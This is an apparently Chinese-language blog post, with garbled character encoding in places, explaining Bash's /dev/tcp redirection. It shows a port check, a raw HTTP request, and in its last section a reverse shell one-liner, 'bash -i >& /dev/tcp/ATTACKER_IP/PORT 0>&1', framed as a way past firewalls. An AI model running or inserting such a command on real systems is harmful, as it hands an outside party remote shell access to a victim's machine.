<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><link rel="alternate" type="application/rss+xml" title="Paul's Blog | Powered by Astro" href="https://paulwang.vercel.app/rss.xml"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="viewport" content="width=device-width"><meta name="generator" content="Astro v5.14.1"><title>Paul's Blog</title><!-- å…è®¸å­å¸ƒå±€æ³¨å…¥é¢å¤–çš„ head å†…å®¹ --><link rel="preload" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css" as="style"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js" as="script"><link rel="stylesheet" href="/_astro/_slug_.BsYvngTm.css">
<link rel="stylesheet" href="/_astro/_slug_.DtFYsS4A.css"><script type="module" src="/_astro/page.DTIbhfSr.js"></script></head>  <div class="page-wrapper"> <!-- <Navigation /> --> <header class="site-header"> <!-- KaTeX èµ„æºä¼˜åŒ–ï¼šä»…åœ¨æ–‡ç« é¡µé¢åŠ è½½ --> <!-- ç§»è‡³ MarkdownPostLayout.astro ä»¥æŒ‰éœ€åŠ è½½ --> <div class="container"> <div class="site-branding"> <a href="/" class="site-logo"> <span>Paul's Blog</span> </a> </div> <button id="mobile-nav-toggle" class="mobile-nav-toggle" aria-label="Toggle menu" aria-expanded="false">
â˜°
</button> <nav class="main-nav"> <a href="/">Home</a> <a href="/blog">Blog</a> <a href="/tags">Tags</a> <a href="/thoughts">Thoughts</a> <a href="/about">About</a> <span class="theme-toggle"><button class="theme-toggle-btn" type="button" aria-label="åˆ‡æ¢æš—è‰²/æµ…è‰²æ¨¡å¼" data-astro-cid-oemx5le4> <div class="taichi" data-astro-cid-oemx5le4></div> </button>  <script type="module">function a(){const t=()=>{const e=document.documentElement;e.classList.toggle("dark");const o=e.classList.contains("dark");localStorage.setItem("theme",o?"dark":"light"),document.querySelectorAll(".theme-toggle-btn").forEach(l=>{l.setAttribute("aria-pressed",o?"true":"false")})};document.querySelectorAll(".theme-toggle-btn").forEach(e=>{e.removeEventListener("click",t),e.addEventListener("click",t),e.setAttribute("aria-pressed",document.documentElement.classList.contains("dark")?"true":"false")})}a();document.addEventListener("astro:page-load",a);const n=typeof localStorage<"u"&&localStorage.getItem("theme")?localStorage.getItem("theme"):window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light";n==="light"?document.documentElement.classList.remove("dark"):document.documentElement.classList.add("dark");window.localStorage.setItem("theme",n);</script></span> </nav> </div> </header> <!-- <h1>Astro</h1> -->      <div class="post-layout-grid" data-astro-cid-5grsw2hi> <header class="post-header" data-astro-cid-5grsw2hi> <h1 data-astro-cid-5grsw2hi>Bash shell magic: /dev/tcp/...</h1> <div class="post-meta" data-astro-cid-5grsw2hi> <span data-astro-cid-5grsw2hi>Author: Paul</span> <time datetime="2025-06-24T00:00:00.000Z" data-astro-cid-5grsw2hi>Publish: June 24, 2025</time> </div> </header>  <aside class="post-toc" data-astro-cid-5grsw2hi> <div class="toc-wrapper" data-astro-cid-5grsw2hi>   <details open data-astro-cid-5grsw2hi> <summary data-astro-cid-5grsw2hi> <h3 data-astro-cid-5grsw2hi>ç›®å½•</h3> </summary> <ul data-astro-cid-5grsw2hi> <li class="depth-2" data-astro-cid-5grsw2hi> <a href="#ç«¯å£æ‰«ææ¢æµ‹" data-astro-cid-5grsw2hi> ç«¯å£æ‰«æ/æ¢æµ‹ </a> </li><li class="depth-2" data-astro-cid-5grsw2hi> <a href="#http-è¯·æ±‚" data-astro-cid-5grsw2hi> HTTP è¯·æ±‚ </a> </li><li class="depth-2" data-astro-cid-5grsw2hi> <a href="#reverse-shell" data-astro-cid-5grsw2hi> Reverse Shell </a> </li> </ul> </details> </div> </aside> <article class="post-content prose prose-slate dark:prose-invert mx-auto p-4" data-astro-cid-5grsw2hi>  <blockquote>
<p>Bash å°† Â <code>/dev/tcp/ä¸»æœº/ç«¯å£</code>Â  è§£é‡Šä¸ºç‰¹æ®Šé‡å®šå‘ï¼Œæ‰“å¼€æ—¶è‡ªåŠ¨å»ºç«‹ TCP socket è¿æ¥ï¼Œè¯»å†™æ“ä½œç›¸å½“äºåœ¨è¯¥è¿æ¥ä¸Šä¼ è¾“æ•°æ®ã€‚<a href="https://stackoverflow.com/questions/76899269/can-someone-explain-how-does-this-command-works-bash-i-dev-tcp-ip-port"></a>â€‹</p>
<p>æ­¤åŠŸèƒ½ä» Bash 2.04 ç‰ˆæœ¬å¼€å§‹æ”¯æŒï¼Œä»…åœ¨ Bash ä¸­æœ‰æ•ˆï¼Œå…¶ä»– shell å¦‚ Zsh ä¸æ”¯æŒã€‚â€‹</p>
</blockquote>
<p>åœ¨ Linux/Unix çš„ä¸–ç•Œé‡Œï¼Œâ€œä¸€åˆ‡çš†æ–‡ä»¶â€ (Everything is a file)ã€‚è¿™ä¸ªå“²å­¦æ€æƒ³æ„å‘³ç€ä½ å¯ä»¥ç”¨ç›¸åŒçš„å‘½ä»¤å’Œæ“ä½œï¼ˆå¦‚ <code>cat</code>, <code>echo</code>, <code>read</code>, é‡å®šå‘ <code>&#x3C;</code> å’Œ <code>></code>) æ¥å¤„ç†ä¸åŒç±»å‹çš„ I/Oï¼Œæ— è®ºæ˜¯çœŸæ­£çš„æ–‡ä»¶ã€ç¡¬ä»¶è®¾å¤‡è¿˜æ˜¯è¿›ç¨‹ã€‚</p>
<p><code>/dev/tcp/...</code> è¿™ä¸ªç‰¹æ€§æ­£æ˜¯è¿™ç§æ€æƒ³çš„å»¶ä¼¸ã€‚è¿™æ ·ï¼Œå°±å¯ä»¥ç”¨æœ€åŸºç¡€çš„ Shell å‘½ä»¤æ¥å®ç°ç½‘ç»œé€šä¿¡ï¼Œè€Œ<strong>æ— éœ€è°ƒç”¨å¤–éƒ¨ç¨‹åº</strong>ï¼Œå¦‚ <code>netcat (nc)</code>ã€<code>telnet</code> æˆ– <code>curl</code>ã€‚è¿™ä¸ªåŠŸèƒ½çš„æ ¸å¿ƒæ˜¯<strong>é‡å®šå‘ (Redirection)</strong>ã€‚</p>
<h2 id="ç«¯å£æ‰«ææ¢æµ‹">ç«¯å£æ‰«æ/æ¢æµ‹</h2>
<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="bash" data-theme="vitesse-light"><code data-language="bash" data-theme="vitesse-light" style="display: grid;"><span data-line=""><span style="color:#A0ADA0"># å°è¯•è¿æ¥åˆ° www.google.com çš„ 80 ç«¯å£</span></span>
<span data-line=""><span style="color:#999999">(</span><span style="color:#998418">echo</span><span style="color:#AB5959"> ></span><span style="color:#B56959"> /dev/tcp/www.google.com/80</span><span style="color:#999999">)</span><span style="color:#999999"> &#x26;</span><span style="color:#AB5959">></span><span style="color:#393A34">/dev/null</span></span></code></pre></figure>
<p>dev_tcp_scan.sh</p>
<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="bash" data-theme="vitesse-light"><code data-language="bash" data-theme="vitesse-light" style="display: grid;"><span data-line=""><span style="color:#A0ADA0">#!/bin/bash</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#B07D48">HOST</span><span style="color:#999999">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">www.baidu.com</span><span style="color:#B5695977">"</span></span>
<span data-line=""><span style="color:#B07D48">PORT</span><span style="color:#999999">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">80</span><span style="color:#B5695977">"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#998418">echo</span><span style="color:#B5695977"> "</span><span style="color:#B56959">æ­£åœ¨æ£€æŸ¥ä¸»æœº $HOST çš„ç«¯å£ $PORT...</span><span style="color:#B5695977">"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#A0ADA0"># è¶…æ—¶è®¾ç½®ï¼ˆå¯é€‰ï¼Œä½†æ¨èï¼‰</span></span>
<span data-line=""><span style="color:#59873A">timeout</span><span style="color:#2F798A"> 1</span><span style="color:#B56959"> bash</span><span style="color:#A65E2B"> -c</span><span style="color:#B5695977"> "</span><span style="color:#B56959">(echo > /dev/tcp/$HOST/$PORT) &#x26;>/dev/null</span><span style="color:#B5695977">"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#1E754F">if</span><span style="color:#999999"> [</span><span style="color:#A65E2B"> $?</span><span style="color:#AB5959"> -eq</span><span style="color:#2F798A"> 0</span><span style="color:#999999"> ];</span><span style="color:#1E754F"> then</span></span>
<span data-line=""><span style="color:#998418">    echo</span><span style="color:#B5695977"> "</span><span style="color:#B56959">æˆåŠŸï¼šç«¯å£ $PORT æ˜¯å¼€æ”¾çš„ã€‚</span><span style="color:#B5695977">"</span></span>
<span data-line=""><span style="color:#1E754F">else</span></span>
<span data-line=""><span style="color:#998418">    echo</span><span style="color:#B5695977"> "</span><span style="color:#B56959">å¤±è´¥ï¼šç«¯å£ $PORT æ˜¯å…³é—­çš„æˆ–ä¸»æœºä¸å¯è¾¾ã€‚</span><span style="color:#B5695977">"</span></span>
<span data-line=""><span style="color:#1E754F">fi</span></span></code></pre></figure>
<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="647" height="109" src="/_astro/-20260104.C-QqgJyX_Z1RvPkq.webp" ></p>
<h2 id="http-è¯·æ±‚">HTTP è¯·æ±‚</h2>
<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="bash" data-theme="vitesse-light"><code data-language="bash" data-theme="vitesse-light" style="display: grid;"><span data-line=""><span style="color:#A0ADA0">#!/bin/bash</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#A0ADA0"># ä½¿ç”¨ exec å°†æ–‡ä»¶æè¿°ç¬¦3ä¸ä¸€ä¸ªåˆ° a.cn çš„80ç«¯å£çš„TCPè¿æ¥å…³è”</span></span>
<span data-line=""><span style="color:#A0ADA0"># &#x3C;> è¡¨ç¤ºå¯è¯»å¯å†™</span></span>
<span data-line=""><span style="color:#998418">exec</span><span style="color:#2F798A"> 3</span><span style="color:#AB5959">&#x3C;></span><span style="color:#B56959">/dev/tcp/cn.bing.com/80</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#A0ADA0"># é€šè¿‡æ–‡ä»¶æè¿°ç¬¦3å‘é€ä¸€ä¸ª HTTP GET è¯·æ±‚</span></span>
<span data-line=""><span style="color:#A0ADA0"># -e è®© echo èƒ½å¤Ÿè§£æ \n æ¢è¡Œç¬¦</span></span>
<span data-line=""><span style="color:#998418">echo</span><span style="color:#A65E2B"> -e</span><span style="color:#B5695977"> "</span><span style="color:#B56959">GET / HTTP/1.1\nHost: cn.bing.com\n\n</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> >&#x26;3</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#A0ADA0"># ä»æ–‡ä»¶æè¿°ç¬¦3è¯»å–å¹¶æ‰“å°æœåŠ¡å™¨çš„å“åº”</span></span>
<span data-line=""><span style="color:#59873A">cat</span><span style="color:#AB5959"> &#x3C;</span><span style="color:#999999">&#x26;</span><span style="color:#59873A">3</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#A0ADA0"># å…³é—­æ–‡ä»¶æè¿°ç¬¦</span></span>
<span data-line=""><span style="color:#998418">exec</span><span style="color:#2F798A"> 3</span><span style="color:#AB5959">&#x3C;</span><span style="color:#999999">&#x26;</span><span style="color:#59873A">-</span></span></code></pre></figure>
<h2 id="reverse-shell">Reverse Shell</h2>
<ul>
<li><a href="https://www.ddosi.org/reverse-shell/#Bash%E5%8F%8D%E5%90%91Shell">åå‘ shell å¤‡å¿˜å•|Reverse Shell Cheat Sheet - ğŸ”° é›¨è‹ â„’ğŸ”°</a></li>
</ul>
<p>ä¸ºäº†ç»•è¿‡é˜²ç«å¢™çš„é™åˆ¶ï¼Œåå‘ Shell åº”è¿è€Œç”Ÿã€‚å®ƒæŠŠè¿æ¥çš„æ–¹å‘å®Œå…¨é¢ å€’äº†è¿‡æ¥ã€‚</p>
<ol>
<li><strong>æ”»å‡»è€…æœºå™¨ (æœåŠ¡å™¨ç«¯)</strong>ï¼šåœ¨è‡ªå·±çš„å…¬ç½‘æœåŠ¡å™¨ä¸Šè¿è¡Œä¸€ä¸ªç¨‹åºï¼Œç›‘å¬åœ¨æŸä¸ªç«¯å£ä¸Šï¼ˆæ¯”å¦‚ <code>4444</code>ï¼‰ï¼Œç­‰å¾…â€œçŒç‰©â€ä¸Šé’©ã€‚</li>
<li><strong>å—å®³è€…æœºå™¨ (å®¢æˆ·ç«¯)</strong>ï¼šä¸»åŠ¨æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œ<strong>ä»å†…éƒ¨å‘èµ·è¿æ¥</strong>ï¼Œå»è¿æ¥æ”»å‡»è€…æœºå™¨çš„ <code>IP:4444</code>ã€‚</li>
<li>ä¸€æ—¦è¿æ¥æˆåŠŸï¼Œå—å®³è€…æœºå™¨å°±æŠŠæœ¬åœ°çš„ Shellï¼ˆ<code>/bin/bash</code>ï¼‰çš„è¾“å…¥è¾“å‡ºï¼Œå…¨éƒ¨äº¤ç»™äº†è¿™ä¸ªä¸»åŠ¨å»ºç«‹çš„è¿æ¥ã€‚</li>
</ol>
<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="bash" data-theme="vitesse-light"><code data-language="bash" data-theme="vitesse-light" style="display: grid;"><span data-line=""><span style="color:#A0ADA0"># -i äº¤äº’å¼</span></span>
<span data-line=""><span style="color:#A0ADA0"># >&#x26; é‡å®šå‘ï¼Œstdout stderrå®šå‘åˆ°/dev/tcp/ATTACKER_IP/PORT</span></span>
<span data-line=""><span style="color:#A0ADA0"># 0>&#x26;1 stdinå®šå‘åˆ°/dev/tcp/ATTACKER_IP/PORTä¸­</span></span>
<span data-line=""><span style="color:#59873A">bash</span><span style="color:#A65E2B"> -i</span><span style="color:#AB5959"> >&#x26;</span><span style="color:#B56959"> /dev/tcp/ATTACKER_IP/PORT</span><span style="color:#AB5959"> 0>&#x26;1</span></span></code></pre></figure>  </article> </div>  <footer class="site-footer"> <div class="container"> <p>
&copy; 2024 - <span id="current-year"></span> | Inspired by
<strong><a href="https://astro.build/" class="about-link">Astro</a></strong> & <strong><a href="https://claude.com/claude-code" class="about-link">Claude Code</a></strong> & <strong><a href="https://github.com/HEIGE-PCloud/DoIt" class="about-link">Dolt</a></strong> </p> </div> </footer> <button id="back-to-top" aria-label="å›åˆ°é¡¶éƒ¨" class="back-to-top" data-astro-cid-wlspcwf4> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-wlspcwf4> <path d="M18 15l-6-6-6 6" data-astro-cid-wlspcwf4></path> </svg> </button>  <script type="module">function i(){const o=document.getElementById("back-to-top");if(!o)return;o.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})});const t=()=>{window.scrollY>300?o.classList.add("is-visible"):o.classList.remove("is-visible")};window.addEventListener("scroll",t),t()}i();document.addEventListener("astro:page-load",i);</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("mobile-nav-toggle"),n=document.querySelector(".main-nav");e&&n&&e.addEventListener("click",()=>{n.classList.toggle("is-open");const i=n.classList.contains("is-open");e.setAttribute("aria-expanded",String(i))})});var c="@vercel/analytics",s="1.5.0",u=()=>{window.va||(window.va=function(...n){(window.vaq=window.vaq||[]).push(n)})};function r(){return typeof window<"u"}function o(){try{const e="production"}catch{}return"production"}function l(e="auto"){if(e==="auto"){window.vam=o();return}window.vam=e}function f(){return(r()?window.vam:o())||"production"}function a(){return f()==="development"}function v(e){return e.scriptSrc?e.scriptSrc:a()?"https://va.vercel-scripts.com/v1/script.debug.js":e.basePath?`${e.basePath}/insights/script.js`:"/_vercel/insights/script.js"}function m(e={debug:!0}){var n;if(!r())return;l(e.mode),u(),e.beforeSend&&((n=window.va)==null||n.call(window,"beforeSend",e.beforeSend));const i=v(e);if(document.head.querySelector(`script[src*="${i}"]`))return;const t=document.createElement("script");t.src=i,t.defer=!0,t.dataset.sdkn=c+(e.framework?`/${e.framework}`:""),t.dataset.sdkv=s,e.disableAutoTrack&&(t.dataset.disableAutoTrack="1"),e.endpoint?t.dataset.endpoint=e.endpoint:e.basePath&&(t.dataset.endpoint=`${e.basePath}/insights`),e.dsn&&(t.dataset.dsn=e.dsn),t.onerror=()=>{const d=a()?"Please check if any ad blockers are enabled and try again.":"Be sure to enable Web Analytics for your project and deploy again. See https://vercel.com/docs/analytics/quickstart for more information.";console.log(`[Vercel Web Analytics] Failed to load script from ${i}. ${d}`)},a()&&e.debug===!1&&(t.dataset.debug="false"),document.head.appendChild(t)}document.addEventListener("DOMContentLoaded",function(){const e=document.getElementById("current-year");e&&(e.textContent=String(new Date().getFullYear()))});m();</script> </div> </html> 